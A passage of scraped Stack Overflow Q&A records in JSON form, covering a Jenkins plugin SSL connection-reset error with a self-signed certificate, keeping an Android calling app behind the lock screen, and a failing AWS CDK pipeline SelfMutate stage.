org.eclipse.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:1652)\r\n\tat hudson.security.ChainedServletFilter$1.doFilter(ChainedServletFilter.java:84)\r\n\tat hudson.security.ChainedServletFilter.doFilter(ChainedServletFilter.java:76)\r\n\tat hudson.security.HudsonFilter.doFilter(HudsonFilter.java:171)\r\n\tat org.eclipse.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:1652)\r\n\tat org.kohsuke.stapler.compression.CompressionFilter.doFilter(CompressionFilter.java:49)\r\n\tat org.eclipse.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:1652)\r\n\tat hudson.util.CharacterEncodingFilter.doFilter(CharacterEncodingFilter.java:81)\r\n\tat org.eclipse.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:1652)\r\n\tat org.kohsuke.stapler.DiagnosticThreadNameFilter.doFilter(DiagnosticThreadNameFilter.java:30)\r\n\tat org.eclipse.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:1652)\r\n\tat org.eclipse.jetty.servlet.ServletHandler.doHandle(ServletHandler.java:585)\r\n\tat org.eclipse.jetty.server.handler.ScopedHandler.handle(ScopedHandler.java:143)\r\n\tat org.eclipse.jetty.security.SecurityHandler.handle(SecurityHandler.java:553)\r\n\tat org.eclipse.jetty.server.session.SessionHandler.doHandle(SessionHandler.java:223)\r\n\tat org.eclipse.jetty.server.handler.ContextHandler.doHandle(ContextHandler.java:1127)\r\n\tat org.eclipse.jetty.servlet.ServletHandler.doScope(ServletHandler.java:515)\r\n\tat org.eclipse.jetty.server.session.SessionHandler.doScope(SessionHandler.java:185)\r\n\tat org.eclipse.jetty.server.handler.ContextHandler.doScope(ContextHandler.java:1061)\r\n\tat org.eclipse.jetty.server.handler.ScopedHandler.handle(ScopedHandler.java:141)\r\n\tat org.eclipse.jetty.server.handler.ContextHandlerCollection.handle(ContextHandlerCollection.java:215)\r\n\tat org.eclipse.jetty.server.handler.HandlerCollection.handle(HandlerCollection.java:110)\r\n\tat org.eclipse.jetty.server.handler.HandlerWrapper.handle(HandlerWrapper.java:97)\r\n\tat org.eclipse.jetty.server.Server.handle(Server.java:499)\r\n\tat org.eclipse.jetty.server.HttpChannel.handle(HttpChannel.java:311)\r\n\tat org.eclipse.jetty.server.HttpConnection.onFillable(HttpConnection.java:257)\r\n\tat org.eclipse.jetty.io.AbstractConnection$2.run(AbstractConnection.java:544)\r\n\tat org.eclipse.jetty.util.thread.QueuedThreadPool.runJob(QueuedThreadPool.java:635)\r\n\tat org.eclipse.jetty.util.thread.QueuedThreadPool$3.run(QueuedThreadPool.java:555)\r\n\tat java.lang.Thread.run(Thread.java:748)\r\n\r\n\r\n```\r\n\r\nI am unable to figure out what&#39;s the problem. Is there is any configuration changes which need to be done in Jenkins.\r\n\r\nWhat can I do to solve the problem? TIA\r\n\r\n \r\n","title":"Getting java.net.SocketException: Connection reset with (SSL- Self Signed Certificate) while invoking API From Jenkins Plugin","body":"<p>I have a sample Java Program which connects to a particular URL and calls an API that Use Self-Signed Certificate.</p>\n<p>The code being called is as follows:</p>\n<pre><code>import java.io.BufferedReader;\nimport java.io.IOException;\nimport java.io.InputStreamReader;\nimport java.net.HttpURLConnection;\nimport java.net.MalformedURLException;\nimport java.net.URI;\n\nimport javax.ws.rs.core.UriBuilder;\n\npublic class test {\n\n    public static void main(String[] args) throws MalformedURLException, IOException {\n    \n        URI uri = UriBuilder.fromPath(&quot;https://test1.com/&quot;).path(&quot;test/AuthorizedUser&quot;).queryParam(&quot;userName&quot;, &quot;abc@test.com&quot;).queryParam(&quot;Password&quot;, &quot;Password1&quot;).build();\n\n        HttpURLConnection connection = (HttpURLConnection) uri.toURL().openConnection();\n\n        connection.setRequestMethod(&quot;GET&quot;);\n        connection.setRequestProperty(&quot;Authorization&quot;, &quot;NoAuth &quot;);\n        connection.setRequestProperty(&quot;Accept&quot;, &quot;application/json&quot;);\n        \n        connection.connect();\n        \n        int responseCode = connection.getResponseCode();\n        \n        if (responseCode == HttpURLConnection.HTTP_OK)\n        {\n            BufferedReader in = new BufferedReader(new InputStreamReader(connection.getInputStream()));\n            String inputLine;\n            StringBuffer response = new StringBuffer();\n\n            while ((inputLine = in.readLine()) != null) {\n                response.append(inputLine);\n            }\n            in.close();\n\n            String result = response.toString();\n            System.out.println(result);\n        }\n\n    }\n\n</code></pre>\n<p>Above mentioned program is working with Java When I installed SSL Certificate in JVM's trust store using these commands:</p>\n<pre><code>C:\\Program Files\\Java\\jre1.8.0_131\\bin\\keytool.exe&quot; -import -file &quot;C:\\Users\\user1\\Desktop\\test1.cer&quot; -keystore &quot;C:\\Program Files\\Java\\jre1.8.0_131\\lib\\security\\cacerts&quot; -alias &quot;Test1_certificate\n\nC:\\Program Files\\Java\\jdk1.8.0_131\\bin\\keytool.exe&quot; -import -file &quot;C:\\Users\\user1\\Desktop\\test1.cer&quot; -keystore &quot;C:\\Program Files\\Java\\jdk1.8.0_131\\jre\\lib\\security\\cacerts&quot; -alias &quot;Test1_certificate\n</code></pre>\n<p>The problem is that when same code is running from Jenkins Plugin, I am getting this error :</p>\n<pre><code>java.net.SocketException: Connection reset\n    at java.net.SocketInputStream.read(SocketInputStream.java:210)\n    at java.net.SocketInputStream.read(SocketInputStream.java:141)\n    at sun.security.ssl.InputRecord.readFully(InputRecord.java:465)\n    at sun.security.ssl.InputRecord.read(InputRecord.java:503)\n    at sun.security.ssl.SSLSocketImpl.readRecord(SSLSocketImpl.java:973)\n    at sun.security.ssl.SSLSocketImpl.performInitialHandshake(SSLSocketImpl.java:1375)\n    at sun.security.ssl.SSLSocketImpl.startHandshake(SSLSocketImpl.java:1403)\n    at sun.security.ssl.SSLSocketImpl.startHandshake(SSLSocketImpl.java:1387)\n    at sun.net.www.protocol.https.HttpsClient.afterConnect(HttpsClient.java:559)\n    at sun.net.www.protocol.https.AbstractDelegateHttpsURLConnection.connect(AbstractDelegateHttpsURLConnection.java:185)\n    at sun.net.www.protocol.https.HttpsURLConnectionImpl.connect(HttpsURLConnectionImpl.java:153)\n    at com.ssts.restcalls.HTTPClientRestCall.GetInputStream(HTTPClientRestCall.java:92)\n    at com.test.restcalls.HTTPClientRestCall.Get(HTTPClientRestCall.java:20)\n    at com.test.restcalls.HttpRestCalls.authenticateUser(JerseyRestCalls.java:59)\n    at com.test.cloud.aCloud.CloudBuilder$DescriptorImpl.AuthenticateUser(CloudBuilder.java:798)\n    at com.test.cloud.acloud.CloudBuilder$DescriptorImpl.checkCredentials(CloudBuilder.java:1060)\n    at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)\n    at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)\n    at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)\n    at java.lang.reflect.Method.invoke(Method.java:498)\n    at org.kohsuke.stapler.Function$InstanceFunction.invoke(Function.java:298)\n    at org.kohsuke.stapler.Function.bindAndInvoke(Function.java:161)\n    at org.kohsuke.stapler.Function.bindAndInvokeAndServeResponse(Function.java:96)\n    at org.kohsuke.stapler.MetaClass$JavaScriptProxyMethodDispatcher.doDispatch(MetaClass.java:490)\n    at org.kohsuke.stapler.NameBasedDispatcher.dispatch(NameBasedDispatcher.java:53)\n    at org.kohsuke.stapler.Stapler.tryInvoke(Stapler.java:746)\n    at org.kohsuke.stapler.Stapler.invoke(Stapler.java:876)\n    at org.kohsuke.stapler.MetaClass$13.dispatch(MetaClass.java:411)\n    at org.kohsuke.stapler.Stapler.tryInvoke(Stapler.java:746)\n    at org.kohsuke.stapler.Stapler.invoke(Stapler.java:876)\n    at org.kohsuke.stapler.Stapler.tryInvoke(Stapler.java:813)\n    at org.kohsuke.stapler.Stapler.invoke(Stapler.java:876)\n    at org.kohsuke.stapler.Stapler.invoke(Stapler.java:649)\n    at org.kohsuke.stapler.Stapler.service(Stapler.java:199)\n    at javax.servlet.http.HttpServlet.service(HttpServlet.java:790)\n    at org.eclipse.jetty.servlet.ServletHolder.handle(ServletHolder.java:812)\n    at org.eclipse.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:1669)\n    at hudson.util.PluginServletFilter$1.doFilter(PluginServletFilter.java:132)\n    at hudson.util.PluginServletFilter.doFilter(PluginServletFilter.java:123)\n    at org.eclipse.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:1652)\n    at hudson.security.csrf.CrumbFilter.doFilter(CrumbFilter.java:49)\n    at org.eclipse.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:1652)\n    at hudson.security.ChainedServletFilter$1.doFilter(ChainedServletFilter.java:84)\n    at hudson.security.ChainedServletFilter.doFilter(ChainedServletFilter.java:76)\n    at hudson.security.HudsonFilter.doFilter(HudsonFilter.java:171)\n    at org.eclipse.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:1652)\n    at org.kohsuke.stapler.compression.CompressionFilter.doFilter(CompressionFilter.java:49)\n    at org.eclipse.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:1652)\n    at hudson.util.CharacterEncodingFilter.doFilter(CharacterEncodingFilter.java:81)\n    at org.eclipse.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:1652)\n    at org.kohsuke.stapler.DiagnosticThreadNameFilter.doFilter(DiagnosticThreadNameFilter.java:30)\n    at org.eclipse.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:1652)\n    at org.eclipse.jetty.servlet.ServletHandler.doHandle(ServletHandler.java:585)\n    at org.eclipse.jetty.server.handler.ScopedHandler.handle(ScopedHandler.java:143)\n    at org.eclipse.jetty.security.SecurityHandler.handle(SecurityHandler.java:553)\n    at org.eclipse.jetty.server.session.SessionHandler.doHandle(SessionHandler.java:223)\n    at org.eclipse.jetty.server.handler.ContextHandler.doHandle(ContextHandler.java:1127)\n    at org.eclipse.jetty.servlet.ServletHandler.doScope(ServletHandler.java:515)\n    at org.eclipse.jetty.server.session.SessionHandler.doScope(SessionHandler.java:185)\n    at org.eclipse.jetty.server.handler.ContextHandler.doScope(ContextHandler.java:1061)\n    at org.eclipse.jetty.server.handler.ScopedHandler.handle(ScopedHandler.java:141)\n    at org.eclipse.jetty.server.handler.ContextHandlerCollection.handle(ContextHandlerCollection.java:215)\n    at org.eclipse.jetty.server.handler.HandlerCollection.handle(HandlerCollection.java:110)\n    at org.eclipse.jetty.server.handler.HandlerWrapper.handle(HandlerWrapper.java:97)\n    at org.eclipse.jetty.server.Server.handle(Server.java:499)\n    at org.eclipse.jetty.server.HttpChannel.handle(HttpChannel.java:311)\n    at org.eclipse.jetty.server.HttpConnection.onFillable(HttpConnection.java:257)\n    at org.eclipse.jetty.io.AbstractConnection$2.run(AbstractConnection.java:544)\n    at org.eclipse.jetty.util.thread.QueuedThreadPool.runJob(QueuedThreadPool.java:635)\n    at org.eclipse.jetty.util.thread.QueuedThreadPool$3.run(QueuedThreadPool.java:555)\n    at java.lang.Thread.run(Thread.java:748)\n\n\n</code></pre>\n<p>I am unable to figure out what's the problem. Is there is any configuration changes which need to be done in Jenkins.</p>\n<p>What can I do to solve the problem? TIA</p>\n"},{"tags":["java","android","react-native"],"answers":[{"tags":[],"owner":{"account_id":2436874,"reputation":1947,"user_id":2498301,"accept_rate":91,"display_name":"Lukas Makor"},"down_vote_count":0,"up_vote_count":3,"is_accepted":true,"score":3,"last_activity_date":1585745418,"creation_date":1585745418,"answer_id":60971272,"question_id":60876523,"body_markdown":"As far as I know the best solution to that problem is having multiple types of activities.\r\n\r\nIn the first activity (calling activity) you set setShowWhenLocked and setTurnScreenOn to true (like you did).  \r\nWhen a call comes in, you start the calling activity which handles the call, because you set the two attributes, the activitiy will be shown to the user even if the device is locked.  \r\nFurthermore, while the call activitiy is active, the user will be able to &quot;lock&quot; his device (i.e. press the power button), and when he unlocks he will be presented with the calling activity again (without entering the code).  \r\nThis is the same behaviour as most default android calling/phone apps have.\r\n\r\nThe second activity is used for your other logic, that should only be accessible when the user really unlocks his phone. (i.e. enter the code)  \r\nSo, when the phone call is ended, you start the second activity from the calling activity, e.g. like this:\r\n       \r\n\r\n     Intent intent = new Intent(this, SecondActivity.class);\r\n     this.startActivity(intent);\r\n\r\nwhere `this` is the instance of the calling activity\r\n\r\nThe just started `SecondActivity` will then automatically be locked behind the lockscreen (i.e. not accessible without unlock) if the phone was locked before.\r\n\r\nI just tested this behaviour in a small test project, if you need further assistance, just ask.\r\n\r\n","title":"How to lock Android device after unlocking with setShowWhenLocked(true);","body":"<p>As far as I know the best solution to that problem is having multiple types of activities.</p>\n\n<p>In the first activity (calling activity) you set setShowWhenLocked and setTurnScreenOn to true (like you did).<br>\nWhen a call comes in, you start the calling activity which handles the call, because you set the two attributes, the activitiy will be shown to the user even if the device is locked.<br>\nFurthermore, while the call activitiy is active, the user will be able to \"lock\" his device (i.e. press the power button), and when he unlocks he will be presented with the calling activity again (without entering the code).<br>\nThis is the same behaviour as most default android calling/phone apps have.</p>\n\n<p>The second activity is used for your other logic, that should only be accessible when the user really unlocks his phone. (i.e. enter the code)<br>\nSo, when the phone call is ended, you start the second activity from the calling activity, e.g. like this:</p>\n\n<pre><code> Intent intent = new Intent(this, SecondActivity.class);\n this.startActivity(intent);\n</code></pre>\n\n<p>where <code>this</code> is the instance of the calling activity</p>\n\n<p>The just started <code>SecondActivity</code> will then automatically be locked behind the lockscreen (i.e. not accessible without unlock) if the phone was locked before.</p>\n\n<p>I just tested this behaviour in a small test project, if you need further assistance, just ask.</p>\n"},{"tags":[],"owner":{"account_id":9499099,"reputation":379,"user_id":7060946,"display_name":"Juha"},"down_vote_count":0,"up_vote_count":0,"is_accepted":false,"score":0,"last_activity_date":1640252773,"creation_date":1640252773,"answer_id":70460283,"question_id":60876523,"body_markdown":"In my VoIP app (baresip), I solved the problem by calling requestDismissKeyguard() function also when power button is pressed to unlock the device. That can be detected by registering a broadcast receiver with IntentFilter(Intent.ACTION_SCREEN_ON).  Then if the device is locked with secured keyguard, requestDismissKeyguard() will ask for a PIN code or password before the user can access the app.\r\n\r\n\r\n ","title":"How to lock Android device after unlocking with setShowWhenLocked(true);","body":"<p>In my VoIP app (baresip), I solved the problem by calling requestDismissKeyguard() function also when power button is pressed to unlock the device. That can be detected by registering a broadcast receiver with IntentFilter(Intent.ACTION_SCREEN_ON).  Then if the device is locked with secured keyguard, requestDismissKeyguard() will ask for a PIN code or password before the user can access the app.</p>\n"}],"owner":{"account_id":16049911,"reputation":1480,"user_id":11584105,"display_name":"Mr. Robot"},"comment_count":0,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":true,"view_count":1733,"favorite_count":0,"down_vote_count":0,"up_vote_count":7,"accepted_answer_id":60971272,"answer_count":2,"score":7,"last_activity_date":1640252773,"creation_date":1585258608,"question_id":60876523,"body_markdown":"I am creating a video calling app and have the following code which is called when the application receives a push notification - it unlocks the screen and presents an &#39;incoming call&#39; user interface:\r\n\r\n```java\r\npublic class MainActivity extends ReactActivity {\r\n\r\n  @Override\r\n  protected String getMainComponentName() {\r\n    return &quot;x&quot;;\r\n  }\r\n\r\n  @Override\r\n  protected void onCreate(Bundle savedInstanceState) {\r\n    super.onCreate(savedInstanceState);\r\n\r\n    if (Build.VERSION.SDK_INT &gt;= Build.VERSION_CODES.O_MR1) {\r\n      setShowWhenLocked(true);\r\n      setTurnScreenOn(true);\r\n    }\r\n    getWindow().addFlags(WindowManager.LayoutParams.FLAG_FULLSCREEN | WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED\r\n        | WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON | WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON\r\n        | WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD);\r\n  }\r\n}\r\n```\r\nThis works fine when a call is incoming - the user can interact with the app using the UI presented. However, the problem is is that if the app is in the foreground and the phone is then locked, when the unlock button is pressed on the side of the phone, the app is displayed, instead of the keyguard / lock screen being displayed. It permanently allows access to the app if it is in the foreground and the phone is locked and the unlock button is pressed.\r\n\r\nI want the app to appear when the it receives a push notification and the screen is locked, but I also want the user to be able to lock the device fully and not give the user access to the app after pressing the lock button. \r\n\r\nHow can I achieve this?\r\n","title":"How to lock Android device after unlocking with setShowWhenLocked(true);","body":"<p>I am creating a video calling app and have the following code which is called when the application receives a push notification - it unlocks the screen and presents an 'incoming call' user interface:</p>\n\n<pre class=\"lang-java prettyprint-override\"><code>public class MainActivity extends ReactActivity {\n\n  @Override\n  protected String getMainComponentName() {\n    return \"x\";\n  }\n\n  @Override\n  protected void onCreate(Bundle savedInstanceState) {\n    super.onCreate(savedInstanceState);\n\n    if (Build.VERSION.SDK_INT &gt;= Build.VERSION_CODES.O_MR1) {\n      setShowWhenLocked(true);\n      setTurnScreenOn(true);\n    }\n    getWindow().addFlags(WindowManager.LayoutParams.FLAG_FULLSCREEN | WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED\n        | WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON | WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON\n        | WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD);\n  }\n}\n</code></pre>\n\n<p>This works fine when a call is incoming - the user can interact with the app using the UI presented. However, the problem is is that if the app is in the foreground and the phone is then locked, when the unlock button is pressed on the side of the phone, the app is displayed, instead of the keyguard / lock screen being displayed. It permanently allows access to the app if it is in the foreground and the phone is locked and the unlock button is pressed.</p>\n\n<p>I want the app to appear when the it receives a push notification and the screen is locked, but I also want the user to be able to lock the device fully and not give the user access to the app after pressing the lock button. </p>\n\n<p>How can I achieve this?</p>\n"},{"tags":["java","amazon-web-services","aws-cdk","aws-codepipeline","aws-codebuild"],"comments":[{"owner":{"account_id":14422932,"reputation":9181,"user_id":10418515,"display_name":"gshpychka"},"score":0,"creation_date":1639588369,"post_id":70366143,"comment_id":124388930,"body_markdown":"You shouldn&#39;t deploy the app stack manually, the pipeline should be the one to do it. Best to destroy the one you deployed yourself. Has the environment been bootstrapped? Can you share some code of the pipeline? Are you specifying the environment for the pipeline stack (account/region)?","body":"You shouldn&#39;t deploy the app stack manually, the pipeline should be the one to do it. Best to destroy the one you deployed yourself. Has the environment been bootstrapped? Can you share some code of the pipeline? Are you specifying the environment for the pipeline stack (account/region)?"},{"owner":{"account_id":8069438,"reputation":93,"user_id":6082641,"display_name":"TJ-AWS"},"score":0,"creation_date":1639626734,"post_id":70366143,"comment_id":124399128,"body_markdown":"Thanks for your response @gshpychka. Yes, I&#39;ve tried all possible ways. Yes, the environment is bootstrapped, let me try and share all that information here.","body":"Thanks for your response @gshpychka. Yes, I&#39;ve tried all possible ways. Yes, the environment is bootstrapped, let me try and share all that information here."},{"owner":{"account_id":14422932,"reputation":9181,"user_id":10418515,"display_name":"gshpychka"},"score":2,"creation_date":1639651273,"post_id":70366143,"comment_id":124405626,"body_markdown":"For debugging, try adding a `cdk ls` to the synth action to see which stacks it&#39;s synthesizing.","body":"For debugging, try adding a <code>cdk ls</code> to the synth action to see which stacks it&#39;s synthesizing."},{"owner":{"account_id":8069438,"reputation":93,"user_id":6082641,"display_name":"TJ-AWS"},"score":0,"creation_date":1639658670,"post_id":70366143,"comment_id":124408216,"body_markdown":"Hi @gshpychka, sorry I&#39;m new to this, I&#39;ve added the code to the questions.\nAs per your suggestion, I&#39;ve added &#39;cdk ls&#39; to synth step and here&#39;s what it gave back:\n`Running command npx cdk ls\nnpx: installed 199 in 4.007s\nXxxJavaxxxStack`","body":"Hi @gshpychka, sorry I&#39;m new to this, I&#39;ve added the code to the questions. As per your suggestion, I&#39;ve added &#39;cdk ls&#39; to synth step and here&#39;s what it gave back: <code>Running command npx cdk ls npx: installed 199 in 4.007s XxxJavaxxxStack</code>"},{"owner":{"account_id":8069438,"reputation":93,"user_id":6082641,"display_name":"TJ-AWS"},"score":0,"creation_date":1639659271,"post_id":70366143,"comment_id":124408415,"body_markdown":"Hi @gshpychka, I believe this is whats happening, the code is synthesising `XxxJavaxxxStack` but its trying to deploy `xxxPipelinexxxStack `, is that why its failing? If so, how to get over this please?","body":"Hi @gshpychka, I believe this is whats happening, the code is synthesising <code>XxxJavaxxxStack</code> but its trying to deploy <code>xxxPipelinexxxStack </code>, is that why its failing? If so, how to get over this please?"},{"owner":{"account_id":14422932,"reputation":9181,"user_id":10418515,"display_name":"gshpychka"},"score":0,"creation_date":1639663528,"post_id":70366143,"comment_id":124410262,"body_markdown":"please format your code in proper code blocks, it is very hard to understand the structure right now. https://meta.stackoverflow.com/questions/251361/how-do-i-format-my-code-blocks","body":"please format your code in proper code blocks, it is very hard to understand the structure right now. <a href=\"https://meta.stackoverflow.com/questions/251361/how-do-i-format-my-code-blocks\" title=\"how do i format my code blocks\">meta.stackoverflow.com/questions/251361/&hellip;</a>"},{"owner":{"account_id":229665,"reputation":33570,"user_id":492773,"display_name":"kichik"},"score":1,"creation_date":1639704028,"post_id":70366143,"comment_id":124423554,"body_markdown":"What&#39;s in `xxxPipelineXXXStage`? It&#39;s supposed to have `xxxJavaxxxStack` in it, but you seem to be initiating that somewhere else.","body":"What&#39;s in <code>xxxPipelineXXXStage</code>? It&#39;s supposed to have <code>xxxJavaxxxStack</code> in it, but you seem to be initiating that somewhere else."},{"owner":{"account_id":8069438,"reputation":93,"user_id":6082641,"display_name":"TJ-AWS"},"score":0,"creation_date":1639707329,"post_id":70366143,"comment_id":124423990,"body_markdown":"Thanks @kichik for help in formatting.\nThe class `xxxPipelineXXXStage` extends stage and just initiates the xxxJavaxxxStack class.\n`new xxxJavaxxxStack(this, &quot;xxxxStack&quot;)`.\nAny help is much appreciated @kichik @gshpychka.","body":"Thanks @kichik for help in formatting. The class <code>xxxPipelineXXXStage</code> extends stage and just initiates the xxxJavaxxxStack class. <code>new xxxJavaxxxStack(this, &quot;xxxxStack&quot;)</code>. Any help is much appreciated @kichik @gshpychka."},{"owner":{"account_id":229665,"reputation":33570,"user_id":492773,"display_name":"kichik"},"score":1,"creation_date":1639707783,"post_id":70366143,"comment_id":124424059,"body_markdown":"You should not initiate your stacks in anywhere but the stage. Try removing it from `xxxxPipelinexxxApp`. Also try adding `cdk ls` to the CodeBuild project for the update pipeline step as @TJ-AWS suggested.","body":"You should not initiate your stacks in anywhere but the stage. Try removing it from <code>xxxxPipelinexxxApp</code>. Also try adding <code>cdk ls</code> to the CodeBuild project for the update pipeline step as @TJ-AWS suggested."},{"owner":{"account_id":8069438,"reputation":93,"user_id":6082641,"display_name":"TJ-AWS"},"score":0,"creation_date":1639708171,"post_id":70366143,"comment_id":124424108,"body_markdown":"Let me try that, thanks @kichik.\nI have one query however, the pipeline is failing even before it reached the deploy &#39;stage&#39;, its failing in selfmutate. Even if I remove it from pipelineapp class, will this selfmutate stage pass?","body":"Let me try that, thanks @kichik. I have one query however, the pipeline is failing even before it reached the deploy &#39;stage&#39;, its failing in selfmutate. Even if I remove it from pipelineapp class, will this selfmutate stage pass?"},{"owner":{"account_id":229665,"reputation":33570,"user_id":492773,"display_name":"kichik"},"score":2,"creation_date":1639709817,"post_id":70366143,"comment_id":124424323,"body_markdown":"Your synth step is synthesizing the wrong templates. It&#39;s not synthesizing the pipeline template which is why the self mutate step fails. It&#39;s unclear why without minimal code reproduction. All we can do is guess.","body":"Your synth step is synthesizing the wrong templates. It&#39;s not synthesizing the pipeline template which is why the self mutate step fails. It&#39;s unclear why without minimal code reproduction. All we can do is guess."},{"owner":{"account_id":14422932,"reputation":9181,"user_id":10418515,"display_name":"gshpychka"},"score":1,"creation_date":1639737703,"post_id":70366143,"comment_id":124430746,"body_markdown":"After fixing the error above, redeploy (just the pipeline) with `cdk deploy PipelineStack`. Don&#39;t forget to remove the app stack in CloudFormation after removing it from the CDK code as suggested above.","body":"After fixing the error above, redeploy (just the pipeline) with <code>cdk deploy PipelineStack</code>. Don&#39;t forget to remove the app stack in CloudFormation after removing it from the CDK code as suggested above."},{"owner":{"account_id":8069438,"reputation":93,"user_id":6082641,"display_name":"TJ-AWS"},"score":0,"creation_date":1639753101,"post_id":70366143,"comment_id":124436263,"body_markdown":"Thanks @gshpychka, I&#39;ll do that and let you guys know. Appreciate your time.","body":"Thanks @gshpychka, I&#39;ll do that and let you guys know. Appreciate your time."},{"owner":{"account_id":8069438,"reputation":93,"user_id":6082641,"display_name":"TJ-AWS"},"score":0,"creation_date":1639753130,"post_id":70366143,"comment_id":124436274,"body_markdown":"Thanks @kichik. Appreciate your time.","body":"Thanks @kichik. Appreciate your time."},{"owner":{"account_id":8069438,"reputation":93,"user_id":6082641,"display_name":"TJ-AWS"},"score":0,"creation_date":1639969522,"post_id":70366143,"comment_id":124475748,"body_markdown":"Hi @kichik, thanks a lot for all the help, I could understand the issue when gshpychka suggested adding &#39;cdk ls&#39; which made me realise I was providing the &lt;git-repo&gt; wrong in the above code, it was pointing to xxxJavaxxxStack repo instead of xxxPipelinexxxStack repo. I&#39;ve updated it now and its working.","body":"Hi @kichik, thanks a lot for all the help, I could understand the issue when gshpychka suggested adding &#39;cdk ls&#39; which made me realise I was providing the &lt;git-repo&gt; wrong in the above code, it was pointing to xxxJavaxxxStack repo instead of xxxPipelinexxxStack repo. I&#39;ve updated it now and its working."},{"owner":{"account_id":8069438,"reputation":93,"user_id":6082641,"display_name":"TJ-AWS"},"score":0,"creation_date":1639969587,"post_id":70366143,"comment_id":124475757,"body_markdown":"Hi @gshpychka, thanks a lot for all the help, I could understand the issue with your help and its now working,","body":"Hi @gshpychka, thanks a lot for all the help, I could understand the issue with your help and its now working,"},{"owner":{"account_id":14422932,"reputation":9181,"user_id":10418515,"display_name":"gshpychka"},"score":1,"creation_date":1639984350,"post_id":70366143,"comment_id":124478144,"body_markdown":"@TJ-AWS you should post the solution as an answer and accept it.","body":"@TJ-AWS you should post the solution as an answer and accept it."}],"answers":[{"tags":[],"owner":{"account_id":8069438,"reputation":93,"user_id":6082641,"display_name":"TJ-AWS"},"down_vote_count":1,"up_vote_count":1,"is_accepted":true,"score":0,"last_activity_date":1640252755,"creation_date":1640074985,"answer_id":70432432,"question_id":70366143,"body_markdown":"The problem existed as I used 2 different github repositories (repos). The first was ```xxxJava``` repo which had ```xxxJavaxxxApp.java``` and ```xxxJavaxxxStack.java``` classes along with other necessary files.\r\nThe second was a ```xxxPipeline``` repo which had ```xxxPipelinexxxApp.java``` and ```xxxPipelinexxxStack.java``` along with other necessary files.\r\n\r\nInitially I was wrong in using ```xxxJava``` repo in **git-repo** for the code ```&lt;git-owner&gt;/&lt;git-repo&gt;``` which was **synthesising** the ```xxxJavaxxxStack``` and the pipeline was expecting ```xxxPipelinexxxStack``` to deploy it.\r\nThe solution was to add the pipeline repo while creating the connection to github.\r\nsince the stage was unable to find this stack, it was failing at the &#39;selfmutate&#39; stage.\r\n\r\nI struck gold when @gshpychka mentioned to add the ```cdk ls``` to my **synth** step to see what stack was getting synth-ed!\r\n```commands(Arrays.asList(&quot;mvn clean install&quot;, &quot;npx cdk synth&quot;, &quot;npx cdk ls&quot;))```\r\n\r\nThe point to remember - till the &#39;selfmutate&#39; stage, the pipeline related changes get deployed, and any stages added after, the actual stack/AWS-services get deployed.","title":"SelfMutate stage failing with CodePipeline","body":"<p>The problem existed as I used 2 different github repositories (repos). The first was <code>xxxJava</code> repo which had <code>xxxJavaxxxApp.java</code> and <code>xxxJavaxxxStack.java</code> classes along with other necessary files.\nThe second was a <code>xxxPipeline</code> repo which had <code>xxxPipelinexxxApp.java</code> and <code>xxxPipelinexxxStack.java</code> along with other necessary files.</p>\n<p>Initially I was wrong in using <code>xxxJava</code> repo in <strong>git-repo</strong> for the code <code>&lt;git-owner&gt;/&lt;git-repo&gt;</code> which was <strong>synthesising</strong> the <code>xxxJavaxxxStack</code> and the pipeline was expecting <code>xxxPipelinexxxStack</code> to deploy it.\nThe solution was to add the pipeline repo while creating the connection to github.\nsince the stage was unable to find this stack, it was failing at the 'selfmutate' stage.</p>\n<p>I struck gold when @gshpychka mentioned to add the <code>cdk ls</code> to my <strong>synth</strong> step to see what stack was getting synth-ed!\n<code>commands(Arrays.asList(&quot;mvn clean install&quot;, &quot;npx cdk synth&quot;, &quot;npx cdk ls&quot;))</code></p>\n<p>The point to remember - till the 'selfmutate' stage, the pipeline related changes get deployed, and any stages added after, the actual stack/AWS-services get deployed.</p>\n"}],"owner":{"account_id":8069438,"reputation":93,"user_id":6082641,"display_name":"TJ-AWS"},"comment_count":17,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":true,"view_count":1963,"favorite_count":0,"down_vote_count":0,"up_vote_count":3,"accepted_answer_id":70432432,"answer_count":1,"score":3,"last_activity_date":1640252755,"creation_date":1639581617,"question_id":70366143,"body_markdown":"I&#39;m trying to create a CI/CD using CDK pipeline with the import ```software.amazon.awscdk.pipelines.CodePipeline``` in Java.\r\nThis pipeline creates another stack named **xxxJavaxxxStack**.\r\nThe pipeline is able to connect to external github, which, when change is detected, triggers the pipeline.\r\n\r\nIn the class ```xxxPipelinexxxApp.java``` I&#39;m calling both the stacks ```xxxJavaxxxStack``` and ```xxxPipelinexxxStack```. I have successfully been able to **cdk synth** both separately and **cdk deploy** them separately.\r\n\r\nThis creates 2 different cloudformation templates, it also creates the pipeline and the first 2 stages go through.\r\nHowever, the pipeline is failing at **SelfMutate** stage.\r\n\r\nThe pipeline stages are:\r\n- **Source** - Success\r\n- **Build** - Success\r\n    - **Synth** - Success\r\n- **SelfMutate** - Failed\r\n\r\nThe error:\r\n```\r\nError: No stacks match the name(s) xxxPipelinexxxStack\r\n\r\nat CdkToolkit.validateStacksSelected 